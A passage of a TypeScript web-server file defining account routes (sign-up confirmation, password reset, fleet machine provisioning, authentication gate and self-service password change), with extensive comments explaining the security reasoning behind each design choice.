       * links already in flight. Turning the switch off and having it not stop
       * anything is the failure worth preventing; the cost is that a person who
       * signed up legitimately minutes before an unrelated close gets a refusal,
       * and the code says exactly which so the screen can tell them rather than
       * calling their link broken.
       *
       * The domain allowlist is deliberately **not** re-checked. Narrowing it is
       * housekeeping rather than an emergency stop, and refusing somebody whose
       * address was allowed when they signed up would be punishing them for an
       * admin's tidying.
       */
      if (!registrationMode(db).enabled) {
        return jsonError(c, 403, "registration_disabled", "sign-ups are closed on this instance");
      }

      const now = Date.now();
      const claimed = claimRegistration(db, token, address, now);
      // One answer for unknown, used and expired — `/v1/enroll`'s discipline, and
      // for its reason: the three are indistinguishable to anybody who does not
      // already hold the token, and telling them apart helps only somebody
      // sweeping.
      if (claimed === null) {
        return jsonError(c, 409, "token_unusable", "this link is unknown, already used, or expired");
      }
      throttle.succeed(key);

      const userId = newId("u");
      db.exec("BEGIN");
      try {
        db.prepare("INSERT INTO users (id, name, is_admin, created_at) VALUES (?, ?, 0, ?)").run(
          userId,
          claimed.name,
          now,
        );
        db.prepare("INSERT INTO user_passwords (user_id, hash, updated_at) VALUES (?, ?, ?)").run(
          userId,
          claimed.passwordHash,
          now,
        );
        db.prepare(
          "INSERT INTO user_emails (user_id, email, email_folded, verified_at, updated_at) VALUES (?, ?, ?, ?, ?)",
        ).run(userId, claimed.email, claimed.emailFolded, now, now);
        db.exec("COMMIT");
      } catch (error) {
        db.exec("ROLLBACK");
        if (isUniqueViolation(error)) {
          /*
           * Somebody took the name, or proved the address, between the sign-up
           * and the click. **Burn the row rather than restore it**: its name is
           * unusable, so leaving it live leaves a link somebody will click again
           * and get the same refusal from.
           *
           * Which of the two it was is decided by asking, rather than by parsing
           * the constraint out of the message — the second is a string match on
           * SQLite's wording.
           */
          const taken = nameTaken(db, claimed.name, now);
          burnRegistration(db, claimed.id, taken ? "name_taken" : "email_taken", now);
          return taken
            ? jsonError(c, 409, "name_taken", "somebody took that name while this link was waiting")
            : jsonError(c, 409, "email_taken", "somebody else confirmed that address while this link was waiting");
        }
        throw error;
      }

      /*
       * **No session, and that is the point of the route rather than an
       * omission.** This used to mint one and hand it back, so opening the link
       * signed you in — which means a confirmation mail sitting in an inbox was
       * a *credential*: anybody who reached that message, on a shared machine, a
       * forwarded thread, or a mailbox still open on an old phone, was signed in
       * to the account with one tap and never had to know the password.
       *
       * A link out of a mailbox proves control of the address. It does not prove
       * you are the person who chose the password at sign-up, and this is the
       * one flow where those can be different people — the password already
       * exists and was chosen minutes ago by somebody who can type it again. So
       * confirming does the thing it says and no more, and the sign-in form is
       * the next step.
       *
       * **`/v1/reset` deliberately keeps its session** and is not the same case:
       * there the link *is* the recovery, the account has no password anybody
       * remembers, and refusing to sign them in would leave them with a password
       * they just set and a form they cannot get past. The difference is whether
       * a password somebody knows already exists.
       *
       * `201`, because this is the request that creates the account.
       */
      return c.json({ user: { id: userId, name: claimed.name }, serverTime: now }, 201);
    },
  );

  /**
   * Ask for a password-reset link.
   *
   * **Always `200`, with a byte-identical body**, whatever the address is. And
   * **no arm of this route hashes anything**, which is what keeps the two
   * branches indistinguishable in time as well as in shape: with no KDF, every
   * path is two indexed reads and at most one insert, and the difference is
   * microseconds against a network round trip. Making them identical to the
   * nanosecond is not achievable with an INSERT on one side, and claiming
   * otherwise would be a promise nobody could keep — what is claimed is that the
   * *observable* difference is far below the noise floor of the network.
   */
  app.post("/v1/forgot", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    // A 409 rather than a 200, and it leaks nothing `GET /v1/instance` does not
    // already publish. A 200 here would promise a message that can never arrive.
    if (!mailConfigured(db).configured) {
      return jsonError(c, 409, "mail_unconfigured", "this control plane cannot send mail");
    }

    const body = await readJsonObject(c);
    const checked = checkEmailAddress(body?.["email"]);
    const address = callerAddress(c);
    const spray = addressKey(address);
    const sprayed = addressThrottle.check(spray);
    if (!sprayed.allowed) return tooManyAttempts(c, sprayed.retryAfterSeconds);

    /*
     * The refusal comes **before** the counter is spent, and it used to come
     * after.
     *
     * `addressThrottle` is one instance shared by `/v1/login`, `/v1/register`
     * and this route, so a request that named no address at all — the cheapest
     * thing anybody can send — spent one of the thirty that gate *signing in*
     * from that address. Recording an attempt that did nothing is the same
     * mistake `throttle.succeed` exists to undo one route over.
     *
     * Still counted for a well-formed address that owns nothing, which is what a
     * spray looks like.
     */
    if (!checked.ok) return c.json({ sent: true });
    addressThrottle.fail(spray);

    /*
     * ⚠ **Everything that distinguishes the two branches happens after the
     * response, and that is what makes the promise above true.**
     *
     * This route answers `{sent: true}` whether or not the address owns
     * anything, so that it cannot be asked "does this person have an account
     * here". The *status* was already identical; the **timing** was not. An
     * address that owns nothing costs one indexed `SELECT`. One that does costs
     * that, plus a second `SELECT`, plus `mintEmailToken`'s
     * `BEGIN`/`UPDATE`/`INSERT`/`COMMIT`, plus the outbox `INSERT` — and
     * `store.ts` runs this database at `PRAGMA synchronous = FULL`, so those are
     * fsyncs against a disk rather than bookkeeping. The difference is
     * milliseconds against microseconds, which is an enumeration oracle anybody
     * can sample over the network by timing two requests.
     *
     * `outbox.ts` already deferred the *drain* for precisely this reason and its
     * `kick` comment says so; what it could not move was the work that happens
     * before the mail is even queued. This is that half.
     *
     * Deferred rather than made constant-time: matching the cost on the empty
     * branch would mean writing rows for addresses nobody owns, which is a
     * denial-of-service surface offered to anonymous callers in exchange for a
     * property `setImmediate` gives for free.
     *
     * The whole block is wrapped: a throw inside a `setImmediate` is an
     * unhandled exception with no request to fail, and losing one recovery mail
     * must not be able to take the process down.
     *
     * `defer` rather than a bare `setImmediate`, so a shutdown between the response
     * and the tick runs this instead of dropping it — see `drainDeferred`. It must
     * stay synchronous for that to keep working.
     */
    const now = Date.now();
    defer(() => {
      try {
        const userId = verifiedOwnerOf(db, checked.folded);
        if (userId === null || !mayMailReset(checked.folded)) return;
        const user = db.prepare("SELECT name, disabled_at FROM users WHERE id = ?").get(userId);
        // A disabled account gets nothing, and says so to nobody.
        if (user === undefined || user["disabled_at"] !== null) return;
        const minted = mintEmailToken(db, userId, "reset", checked.folded, RESET_TTL_MS, now);
        send(
          checked.address,
          "reset",
          passwordReset({
            name: String(user["name"]),
            url: `${publicOrigin()}/reset#t=${minted.token}`,
            lifetime: lifetimeText(RESET_TTL_MS),
          }),
          minted.expiresAt,
        );
      } catch (error) {
        console.error(`forgot failed after answering: ${describeError(error)}`);
      }
    });

    return c.json({ sent: true });
  });

  /**
   * Spend a reset link.
   *
   * **Read, validate, hash, then claim** — and the order is the whole design.
   * Claiming first means somebody who typed a password one character too short
   * has burned their link and needs a whole new message, which is the dead end
   * that makes people give up on a recovery flow. The claim happens last, as a
   * conditional `UPDATE`, which is also what closes the double-submit race.
   *
   * **API keys are kept.** The deleted admin reset swept them because a reset was
   * for the case where somebody else may have the account. A mailbox proves
   * control of an address, not that the account was compromised, and
   * `POST /v1/me/password` — the closest precedent, reached by a different proof
   * — keeps them for a stated reason: a key is a separate credential with a
   * separate lifecycle and `cpctl` is holding one. Silently killing somebody's
   * `cpctl` key because they forgot a password is a worse surprise than the risk
   * it removes. What is *not* silent is the count: `apiKeysActive` rides the
   * response so the screen can offer to revoke them.
   */
  app.post("/v1/reset", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const token = body["token"];
    const next = body["newPassword"];
    if (typeof token !== "string" || token.length === 0 || token.length > 200) {
      return jsonError(c, 400, "bad_request", "token is required");
    }
    if (typeof next !== "string" || next.length > MAX_PASSWORD_FIELD_CHARS) {
      return jsonError(c, 400, "bad_request", "newPassword is required");
    }

    const address = callerAddress(c);
    const key = resetKey(address);
    const decision = throttle.check(key);
    if (!decision.allowed) return tooManyAttempts(c, decision.retryAfterSeconds);

    /*
     * **The counter is spent by a bad token and by nothing else, and there is no
     * `succeed()` on this route at all.**
     *
     * `resetKey` bounds *guessing at a link*. Two wrong shapes were tried before
     * this one. Recording optimistically at the top and un-recording after the
     * claim made every **weak-password** refusal count as a guess — and the
     * policy check deliberately runs before the claim so the link survives one —
     * so five tries at a 12-character minimum, an ordinary number for somebody
     * meeting it for the first time, answered `429` and put the person behind a
     * doubling block while their token expired. Moving `succeed()` above the
     * policy check fixed that and opened something worse: the token is not
     * consumed until `claimEmailToken` far below, so anybody holding **one** live
     * token — which is anybody who can call `/v1/forgot` — could replay it with a
     * deliberately weak password to reset the counter at will, and spray guesses
     * at other tokens between the replays with the bound permanently lifted.
     *
     * So: record on the refusals a guesser actually reaches, and nowhere else.
     * That needs no `succeed()`, because nothing optimistic is written to undo.
     *
     * The "record the attempt **before** the `await`" invariant does not apply
     * here, and it is worth saying why rather than looking like an exception:
     * that rule exists because `/v1/login` reaches a ~51ms KDF on every request,
     * so concurrent guesses all pass a counter nothing has incremented yet. On
     * this route every refusal below is reached by synchronous indexed reads —
     * the only `await` is `hashPassword`, and a guesser never gets to it.
     */
    const guessed = () => {
      throttle.fail(key);
      return jsonError(c, 409, "token_unusable", "this link is unknown, already used, or expired");
    };

    const now = Date.now();
    const held = readEmailToken(db, token, now);
    if (held === null || held.purpose !== "reset") {
      return guessed();
    }

    const user = db.prepare("SELECT id, name, is_admin, disabled_at FROM users WHERE id = ?").get(held.userId);
    if (user === undefined) {
      return guessed();
    }
    /*
     * **This route has no caller, so it reads `disabled_at` itself.** `disable`
     * burns live tokens, and this is the second, independent answer to the same
     * question — `burnUserCodes`' lesson applied one table over, where the hole
     * was that `/v1/enroll` asks only whether a code is unused and unexpired.
     * The token is burned here too, so a banned account cannot keep trying.
     */
    if (user["disabled_at"] !== null) {
      burnEmailTokens(db, held.userId, "user_disabled", now);
      return jsonError(c, 403, "user_disabled", "this account has been disabled");
    }

    /*
     * The address must still be the one the token was minted for. Without this,
     * verifying `a@b`, changing to `c@d` and clicking the old link resets on
     * proof of an address the account no longer has.
     *
     * **It does not require the address to be verified already**, and that is
     * what makes an invitation work rather than needing a third token purpose.
     * The rule is one sentence in both directions: *spending a link proves
     * control of the address it was mailed to*, so an unverified address becomes
     * verified below. Reaching this with an unverified address is only possible
     * by invitation — `POST /v1/forgot` mints for verified owners only — so the
     * generalisation costs nothing and removes a state machine.
     */
    const current = emailOf(db, held.userId);
    if (current === null || current.emailFolded !== held.emailFolded) {
      burnEmailTokens(db, held.userId, "email_changed", now);
      return guessed();
    }

    /*
     * From here the token is real, so nothing below touches the counter — see
     * `guessed` above for why there is no `succeed()` to balance it.
     */
    const weak = checkPasswordPolicy(next, String(user["name"]));
    // Deliberately before the claim: the link survives a refused password, and
    // it no longer costs the person one of five attempts to find that out.
    if (weak !== null) return jsonError(c, 400, "weak_password", weak);

    let hash: string;
    try {
      // `"public"` because the route is above THE LINE. The lane is about which
      // side of the gate the *route* sits on, not about how the caller feels.
      hash = await hashPassword(next, "public");
    } catch (error) {
      if (error instanceof PasswordBusyError) return passwordBusy(c);
      throw error;
    }

    let revoked = 0;
    db.exec("BEGIN");
    try {
      /*
       * The claim is **inside** the transaction, and it used to sit above it.
       *
       * `claimEmailToken` is the conditional `UPDATE` that makes this link
       * single-use, so out here in autocommit it spent the link before anything
       * else was written — and the `ROLLBACK` below then undid the password, the
       * session sweep and the verification while the link stayed burned. The
       * reachable case is an invitation: `markVerified` can trip the partial
       * unique index when somebody else proved that address in between, and the
       * invited person, whose only credential this was, is left with no password
       * and no way back but an admin re-invite.
       *
       * Nothing between the old position and here awaited, and it opens no
       * transaction of its own, so moving it costs nothing and the whole act is
       * now one unit.
       */
      if (!claimEmailToken(db, token, address, now)) throw new TokenNotClaimed();
      db.prepare(
        "INSERT INTO user_passwords (user_id, hash, updated_at) VALUES (?, ?, ?) " +
          "ON CONFLICT(user_id) DO UPDATE SET hash = excluded.hash, updated_at = excluded.updated_at",
      ).run(held.userId, hash, now);
      // Chosen by the person holding the link, so it counts as theirs — for an
      // invitation this is the first password they ever chose, and the screen
      // saying "Changed just now" over it is the truth.
      markPasswordChanged(db, held.userId, now);
      revoked = revokeAllSessions(db, held.userId, null, now);
      burnEmailTokens(db, held.userId, "password_changed", now);
      // Spending the link proved the address. For a reset it was already
      // verified and this changes nothing; for an invitation it is the whole
      // verification, which is why an invited account needs no separate step.
      //
      // The boolean is checked because it is the *other* way this statement can
      // fail: the unique index throws, but a `user_emails` row that moved between
      // `emailOf` above and here simply matches nothing, and an unchecked call
      // would commit a password against an address nobody proved.
      if (current.verifiedAt === null && !markVerified(db, held.userId, held.emailFolded, now)) {
        throw new TokenNotClaimed();
      }
      // An invitation is a reset against an account that never had a password, so
      // this is also the path that clears the obligation for an invited person.
      db.prepare("DELETE FROM password_obligations WHERE user_id = ?").run(held.userId);
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      // The conditional UPDATE matched nothing: two taps on a phone, or a link
      // already spent. Thrown rather than returned so the one exit from this
      // block stays the `ROLLBACK` above — an un-rolled-back `BEGIN` takes out
      // the *next* writer on the shared connection, not this request.
      if (error instanceof TokenNotClaimed) {
        return jsonError(c, 409, "token_unusable", "this link is unknown, already used, or expired");
      }
      if (isUniqueViolation(error)) {
        // Somebody else verified this address between the invitation and the
        // click. The partial unique index is doing its job; the link is void —
        // and now genuinely void rather than merely spent, because the claim
        // rolled back with everything else.
        return jsonError(c, 409, "email_taken", "somebody else has already confirmed that address");
      }
      throw error;
    }

    const keysActive = Number(
      db.prepare("SELECT COUNT(*) AS n FROM api_keys WHERE user_id = ? AND revoked_at IS NULL").get(held.userId)?.[
        "n"
      ] ?? 0,
    );

    const session = mintSession(db, held.userId, {
      ip: address,
      userAgent: c.req.header("user-agent") ?? null,
    });
    return c.json({
      token: session.token,
      sessionId: session.id,
      expiresAt: session.expiresAt,
      user: {
        id: held.userId,
        name: String(user["name"]),
        isAdmin: Number(user["is_admin"]) === 1,
      },
      sessionsRevoked: revoked,
      apiKeysActive: keysActive,
      serverTime: now,
    });
  });

  /**
   * Provision a machine for somebody else, with the fleet provisioning key.
   *
   * **Above THE LINE because it carries its own credential, not a caller's.**
   * `callerAuth` resolves API keys and session tokens and would refuse a `pk_`
   * outright, so this joins `/v1/enroll` as a route that authenticates itself —
   * the public set is now ten, and two of them take a credential in the body.
   * It is emphatically *not* an unauthenticated route; the credential is simply
   * not a person's.
   *
   * **Why it exists.** Adding a daemon needed a credential belonging to whoever
   * would own it — their sign-in for the web form, or an API key for `cpctl` —
   * so an admin setting up a host for somebody had to borrow their account or
   * hand them a credential. An admin's own key would work and is full authority
   * over the fleet, which is not a thing to paste into an install script.
   *
   * **What it does, and the list is the whole of it:** create the machine owned
   * by the named user, raise that user's machine limit if it would not fit, and
   * mint the single-use enrollment code. It cannot revoke, rename, grant, read a
   * transcript or touch a user.
   *
   * **The daemon never sees this key**, and that is load-bearing rather than
   * incidental: this service's oldest invariant is that a daemon makes exactly
   * one control-plane request, ever, at enrollment. So provisioning is an act of
   * the *installer* — `install.sh` or `cpctl` calls this, gets an ordinary code,
   * and writes it into the env file. `enroll.ts` and the daemon are untouched.
   *
   * **The limit is raised rather than the request refused**, which is the point:
   * an admin provisioning a machine has decided that person may have it, and a
   * `409 machine_limit` at that moment would mean the install script fails and
   * somebody has to go and change a number. Written as a visible override, so
   * Settings → Users shows the limit came from somewhere rather than the number
   * silently disagreeing with what an admin set.
   *
   * ⚠ **The threat is not the obvious one.** Holding this key reads nobody's
   * work — but it inserts a machine of the holder's own into any user's list,
   * and that user may then run agents on the holder's host. Rotation is the
   * remedy and is why the key lives in a table with `revoked_at`.
   */
  app.post("/v1/provision", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    /*
     * Counted before anything is read, on the address, in its own namespace.
     *
     * This key is long-lived and fleet-wide, so guessing it is the attack — where
     * an enrollment code is single-use and lives an hour. Counted on every
     * attempt rather than on failures, for `/v1/enroll`'s reason: there is no
     * identity here to be fair to, the credential *is* the body.
     */
    const address = callerAddress(c);
    const guess = provisionKey(address);
    const guessed = addressThrottle.check(guess);
    if (!guessed.allowed) return tooManyAttempts(c, guessed.retryAfterSeconds);
    addressThrottle.fail(guess);

    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const presented = body["key"];
    if (typeof presented !== "string" || presented.length === 0) {
      return jsonError(c, 400, "bad_request", "key is required");
    }
    const keyId = resolveProvisioningKey(db, presented);
    // One answer for "no such key", "revoked" and "there is no key on this
    // instance", so a caller cannot learn which by asking.
    if (keyId === null) {
      return jsonError(c, 401, "invalid_provisioning_key", "that provisioning key is not valid");
    }

    const userRef = body["user"];
    if (typeof userRef !== "string" || userRef.trim().length === 0) {
      return jsonError(c, 400, "bad_request", "user is required — an id or a name");
    }
    const named = readLabel(body["machine"]);
    if (!named.ok) return jsonError(c, 400, "bad_request", named.message);

    /*
     * By id first, then by name, because an installer is written by a person and
     * a name is what a person has. Case-folded on the name for the reason
     * `idx_users_name_folded` exists.
     *
     * **`.all()` rather than `.get()`, because the fold is not unique.**
     * `users.name` is `UNIQUE` and SQLite compares it BINARY, and
     * `idx_users_name_folded` is a plain index rather than a unique one — it
     * exists to make `lower(name)` cheap, not to bound it. `nameTaken` in
     * `registration.ts` case-folds, so self-signup cannot make a collision, but
     * `POST /v1/admin/users` checks `WHERE name = ?` exactly, so an admin can
     * create `alice` beside `Alice` and nothing refuses it.
     *
     * With `.get()` the row SQLite happened to yield first decided everything
     * downstream: which account got a machine, an `ALL_SCOPES` grant and a
     * raised limit, and *whose* `disabled_at` the refusal below was read from.
     * A provisioning key holder asking for one person could silently hand the
     * host to another. Refused rather than guessed, because there is no answer
     * here that is better than making the caller spell the id.
     */
    const wanted = userRef.trim();
    const byId = db.prepare("SELECT id, name, disabled_at FROM users WHERE id = ?").get(wanted);
    const byName = byId
      ? []
      : db.prepare("SELECT id, name, disabled_at FROM users WHERE lower(name) = ?").all(wanted.toLowerCase());
    if (byName.length > 1) {
      return jsonError(
        c,
        409,
        "user_ambiguous",
        `more than one account is named "${wanted}" bar case — provision by user id instead`,
      );
    }
    const user = byId ?? byName[0];
    if (!user) return jsonError(c, 404, "user_not_found", "no such user");
    // A banned account's machines are switched off the moment they are made, so
    // provisioning one would hand somebody an installer that produces a daemon
    // nothing can reach. Refused with the reason rather than silently.
    if (user["disabled_at"] !== null) {
      return jsonError(c, 403, "user_disabled", "that user is disabled");
    }
    const ownerId = String(user["id"]);

    ensureSigningKey(db);

    if (nameVisibleTo(db, ownerId, named.label)) {
      return jsonError(c, 409, "machine_exists", "that user can already see a machine with that name");
    }

    /*
     * Enough limit for this machine to work, and not a unit more.
     *
     * `owned + 1` rather than `limit + 1`: provisioning twice for somebody at
     * their limit should leave them able to run both machines and no others, and
     * incrementing a limit that is already generous would quietly widen it.
     * Clamped by `createOwnedMachine` against the fleet ceiling regardless, so
     * this cannot be used to climb past fifty.
     */
    const before = effectiveLimit(db, ownerId);
    const owned = machineCount(db, ownerId);
    const raisedTo = owned >= before.limit ? Math.min(owned + 1, MAX_MACHINES_PER_USER) : null;

    /*
     * **The machine first, and the limit only once it exists.**
     *
     * This used to write the limit here, above the create, and neither refusal
     * below undid it — so a *failed* provision permanently widened somebody's
     * quota. The ceiling arm is the one that hurts: a user owning fifty machines
     * under an admin-lowered limit of five gets `min(51, 50)` written, then
     * `createOwnedMachine` refuses `too_many`, and the request 409s having
     * silently un-suspended forty-five machines an admin had deliberately
     * switched off. Nothing reported it, because `machineLimitRaisedTo` only
     * rides the 201.
     *
     * `createOwnedMachine` takes the limit as an argument and never reads one, so
     * passing the intended number before writing it is exactly equivalent for the
     * bound it enforces. It opens its own transaction, and `node:sqlite` has no
     * nested `BEGIN`, so this is an ordering rather than one transaction — which
     * is enough, because the residue now falls the safe way: a write that throws
     * after the create leaves a machine *over* the limit, i.e. one that does not
     * work and that an admin can fix, rather than machines that work and should
     * not.
     */
    const created = createOwnedMachine(db, ownerId, named.label, ALL_SCOPES, raisedTo ?? before.limit);
    if ("error" in created) {
      if (created.error === "too_many") {
        // Only reachable at the fleet ceiling, which this route may not raise.
        return jsonError(
          c,
          409,
          "machine_limit",
          `that user is at the fleet-wide ceiling of ${MAX_MACHINES_PER_USER} machines`,
        );
      }
      return jsonError(c, 409, "machine_exists", "that user already has a machine with that name");
    }
    if (raisedTo !== null) writeMachineLimit(db, ownerId, raisedTo, keyId);

    /*
     * `created_by` is the *key's* id, not a user's.
     *
     * The column is the only forensic trail an enrollment code has, and writing
     * the owner there would say they minted it when they may never have heard of
     * this host. A `pk_…` in that column is greppable and true.
     */
    const enrollment = mintEnrollmentCode(db, created.id, keyId, ENROLLMENT_CODE_TTL_MS);
    return c.json(
      {
        machine: { id: created.id, name: named.label },
        owner: { id: ownerId, name: String(user["name"]) },
        enrollment: { code: enrollment.code, expiresAt: enrollment.expiresAt },
        controlPlaneUrl: installOrigin(c, trustedProxyHops),
        // Said out loud because it changed something outside this request, and an
        // admin reading Settings → Users should not find a number they did not set
        // and cannot explain.
        machineLimitRaisedTo: raisedTo,
      },
      201,
    );
  });

  /* ---------------------------------------------------------------- *
   * ⚠ THE LINE. Everything registered below it needs a credential.
   *
   * **The public set is "the routes above this line", and that is the whole
   * mechanism.** Hono composes handlers in registration order and a handler that
   * returns a Response ends the chain, so `/health`, `/v1/jwks` and `/v1/enroll`
   * — registered above — never reach this middleware. Measured against a real
   * app: those answer 200 while `/v1/me`, `/v1/nope` and everything else under
   * `/v1` answer 401.
   *
   * It replaces four *exact-path* lines (`/v1/me`, `/v1/machines`, `/v1/tokens`,
   * `/v1/admin/*`) and the comment that used to be here warning that they were
   * exact. They were, and it was not a warning anybody could act on: measured,
   * `app.use("/v1/machines", …)` runs for `/v1/machines` and for nothing else, so
   * `POST /v1/machines/:id/enrollments` — a route this service now has — served
   * with **no credential at all**. Minting an enrollment code is minting a full
   * machine identity: a tunnel key, and every token addressed to that machine. An
   * allowlist of prefixes would have the same shape of hole one route later.
   *
   * A new public route therefore goes **above** this line, deliberately, and a new
   * private one goes below it by doing nothing. That is the opposite of what this
   * file used to do and the same thing `src/server.ts` has always done.
   * ---------------------------------------------------------------- */
  app.use("/v1/*", callerAuth(db));

  /*
   * The body bound for everything the gate admits, registered immediately after
   * it and deliberately not before.
   *
   * **After, so an anonymous caller is refused before anything is read at all.**
   * `callerAuth` answers 401 without touching the body, so putting the limit
   * first would only change which refusal a credential-less flood receives while
   * costing this middleware a run on every unauthenticated probe.
   *
   * `/v1/login` and `/v1/enroll` are registered *above* THE LINE and therefore
   * never reach either of these — they keep the tighter `PUBLIC_BODY_LIMIT_BYTES`
   * they carry themselves, which is the same registration-order mechanism the
   * gate above is built on.
   */
  app.use("/v1/*", bodyLimit({ maxSize: BODY_LIMIT_BYTES, onError: payloadTooLarge }));

  const requireAdmin: MiddlewareHandler<AppEnv> = async (c, next) => {
    if (!c.get("caller").isAdmin) {
      return jsonError(c, 403, "forbidden", "this endpoint requires an admin key");
    }
    return next();
  };

  app.get("/v1/me", (c) => {
    const caller = c.get("caller");
    // One read for a field pair that used to make three, on the route every cold
    // load and every wake hits. `emailOf` compiles its statement per call.
    const address = emailOf(db, caller.userId);
    const quota = effectiveLimit(db, caller.userId);
    const owned = machineCount(db, caller.userId);
    return c.json({
      id: caller.userId,
      name: caller.name,
      isAdmin: caller.isAdmin,
      /*
       * Which credential this is, and whether there is a password at all.
       *
       * Neither is an authorization fact — both credentials are full authority.
       * They are what lets a client stop guessing: `via` decides whether there is
       * a session to sign out of, and `hasPassword` distinguishes "change your
       * password" from "set one", which is the state every user carried over from
       * before this feature is in and which is otherwise indistinguishable from a
       * forgotten one.
       */
      via: caller.via,
      hasPassword: db.prepare("SELECT 1 FROM user_passwords WHERE user_id = ?").get(caller.userId) !== undefined,
      /*
       * When they last chose a password themselves, or `null`.
       *
       * `null` covers three states the screen draws as one word ("Set"): the
       * row predates the column, the password was issued by an admin or the
       * bootstrap and never replaced, or there is no password at all — and
       * `hasPassword` beside it is what separates the last from the other two.
       * Deliberately not `user_passwords.updated_at`: that is rewritten by the
       * best-effort rehash on sign-in and by an admin's temporary password,
       * neither of which is the person changing anything.
       */
      passwordChangedAt: passwordChangedAt(db, caller.userId),
      /*
       * The address, and whether it has been proved.
       *
       * `emailVerified` is carried rather than derived from `email !== null`,
       * because the two are genuinely different states and the difference is the
       * whole of what an address is worth: an unverified one reserves nothing and
       * `POST /v1/forgot` will not mail it. A client that inferred one from the
       * other would tell somebody they can recover their account when they cannot.
       */
      email: address?.email ?? null,
      emailVerified: address !== null && address.verifiedAt !== null,
      /*
       * Whether this account is refused everything else until it sets a password.
       *
       * On the route whose docblock says it exists so a client can stop guessing,
       * and it is the **only** way to discover the obligation — which is why
       * `GET /v1/me` is one of the four routes registered above THE SECOND LINE.
       */
      mustChangePassword: obligationOf(db, caller.userId) !== null,
      mustChangePasswordReason: obligationOf(db, caller.userId),
      /*
       * How many machines they own, their ceiling, and whether they may add one.
       *
       * **`canAddMachine` is computed here rather than left to the client**, and
       * that is the point of sending it: "somebody at their limit is not offered
       * a way to add more" is a rule this service owns, and a client deriving it
       * from the two numbers beside it is a second copy that drifts the first
       * time the rule gains a clause. The counts go too, because the *sentence*
       * a screen draws needs them — "you are using all 2 of your 2" cannot be
       * written from a boolean.
       *
       * `machineLimitSource` is deliberately absent. Whether a person's limit
       * came from a row of their own or from the instance default is an
       * administrative fact, they can do nothing with it, and telling somebody
       * they are special invites the question of why.
       *
       * Two extra statements on the route every cold load and every wake hits.
       * The alternative is a second round trip on that same cold load.
       */
      machineCount: owned,
      machineLimit: quota.limit,
      canAddMachine: owned < quota.limit,
    });
  });

  /* ---------------------------------------------------------------- *
   * Your own account
   *
   * The four routes between here and THE SECOND LINE are the ones that stay
   * reachable while an account owes a password change. Each earns it:
   *
   *   - `GET /v1/me` is the only way to *discover* the obligation.
   *   - `POST /v1/me/password` is the remedy, and refusing the remedy is the
   *     failure `throttle.ts` records at length — the remedy blocked by the
   *     thing it is the remedy for.
   *   - `DELETE /v1/me/sessions/current` — signing out on a shared machine must
   *     not require first choosing a password.
   *   - `DELETE /v1/me/sessions` — "sign out everywhere" is exactly what
   *     somebody does when they think the password they were handed has leaked,
   *     which is the circumstance this obligation exists for.
   *
   * Everything else, including `GET /v1/me/sessions` (a list is not a remedy),
   * `POST /v1/me/keys` (minting a permanent credential from a borrowed password
   * is the escalation itself) and every admin route, goes below.
   * ---------------------------------------------------------------- */

  /**
   * Set or change your own password.
   *
   * **`currentPassword` is required whenever there is one to give**, even under a
   * valid session, and that is the one rule here worth defending. A session token
   * is the credential most likely to be stolen — it lives in `localStorage` on an
   * origin with no CSP — and without this rule a token lifted from a tab converts
   * into permanent ownership of the account in one request. With it, the thief
   * has what they stole until it expires and nothing more.
   *
   * The exception is a user who has **no password row**: every account that
   * predates this feature. Their API key is the proof, and it was already full
   * authority over the account, so requiring a password they have never had would
   * make the migration impossible rather than safe.
   */
  app.post("/v1/me/password", async (c) => {
    const caller = c.get("caller");
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");

    const next = body["newPassword"];
    const current = body["currentPassword"];
    if (typeof next !== "string" || next.length > MAX_PASSWORD_FIELD_CHARS) {
      return jsonError(c, 400, "bad_request", "newPassword is required");
    }
    if (current !== undefined && (typeof current !== "string" || current.length > MAX_PASSWORD_FIELD_CHARS)) {
      return jsonError(c, 400, "bad_request", "currentPassword must be a string");
    }

    const problem = checkPasswordPolicy(next, caller.name);
    // Said in full, unlike a login refusal: the caller is already authenticated
    // and it is their own password, so there is nobody to keep it from.
    if (problem !== null) return jsonError(c, 400, "weak_password", problem);

    const stored = db.prepare("SELECT hash FROM user_passwords WHERE user_id = ?").get(caller.userId);

    try {
      if (stored !== undefined) {
        if (typeof current !== "string" || current.length === 0) {
          return jsonError(c, 400, "bad_request", "currentPassword is required");
        }
        /*
         * **`passwordChangeKey`, not the caller's name.** This route and
         * `POST /v1/login` shared one key space and one instance, so a stranger
         * spraying the sign-in form with somebody's name blocked that person from
         * changing their password on a valid session — the remedy blocked by the
         * attack it is the remedy for. The key is namespaced on the *user id*,
         * which nothing anonymous can write and nobody else can type.
         */
        const key = passwordChangeKey(caller.userId);
        const decision = throttle.check(key);
        if (!decision.allowed) return tooManyAttempts(c, decision.retryAfterSeconds);
        // Recorded before the await and cleared on success, for the reason the
        // login route states at length: `check` is synchronous, so without this
        // every attempt inside one KDF window sees a counter nothing has moved.
        throttle.fail(key);
        const verified = await verifyPassword(current, String(stored["hash"]), "authenticated");
        if (!verified.ok) {
          return jsonError(c, 401, "invalid_password", "that is not your current password");
        }
        throttle.succeed(key);
      }

      const hash = await hashPassword(next, "authenticated");
      const now = Date.now();

      /*
       * Three writes, one act.
       *
       * This block was bare — an upsert and then a revoke, with nothing tying
       * them together — and a third write is what makes the grouping worth
       * stating: dropping the obligation is what *ends the wall*, so a commit
       * that wrote the new hash and then failed would leave somebody holding a
       * password that works and a gate that will not let them past. There is no
       * `await` inside, which is the file's own rule for this shared synchronous
       * connection.
       */
      let revoked = 0;
      db.exec("BEGIN");
      try {
        db.prepare(
          "INSERT INTO user_passwords (user_id, hash, updated_at) VALUES (?, ?, ?) " +
            "ON CONFLICT(user_id) DO UPDATE SET hash = excluded.hash, updated_at = excluded.updated_at",
        ).run(caller.userId, hash, now);
        // The one fact `GET /v1/me` draws about this act, written beside the act.
        markPasswordChanged(db, caller.userId, now);

        /*
         * Every other session goes, and this one stays.
         *
         * Changing a password is what somebody does when they think somebody
         * else has it, so a change that leaves the other party signed in has done
